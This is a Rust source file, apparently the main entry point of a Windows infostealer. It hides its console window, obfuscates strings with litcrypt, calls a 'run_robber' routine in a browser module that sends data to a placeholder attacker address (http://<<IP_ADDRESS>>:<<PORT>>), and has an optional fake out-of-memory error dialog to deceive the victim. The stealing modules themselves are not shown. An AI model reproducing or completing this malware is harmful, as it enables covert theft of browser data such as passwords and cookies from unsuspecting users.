#![windows_subsystem = "windows"]
mod browser;
mod crypto;
mod robber;
use litcrypt::{lc, use_litcrypt};
use std::ffi::CString;
use user32::MessageBoxA;

use_litcrypt!("<<SECRET_KEY>>");

fn main() -> () {
    let error: bool = false;
    let error_message = r#"There isn't enough memory to complete this action. Try using less data or closing other applications."#;
    let url = "http://<<IP_ADDRESS>>:<<PORT>>";
    let _ = browser::run_robber(true, true, url);
    if error == true {
        let _ = show_error(error_message);
    }
}

fn show_error(error_message: &str) -> Result<i32, ()> {
    let title = CString::new("Error!").unwrap();
    let message = CString::new(error_message).unwrap();
    unsafe {
        MessageBoxA(std::ptr::null_mut(), message.as_ptr(), title.as_ptr(), 0x10);
    }
    Ok(0)
}
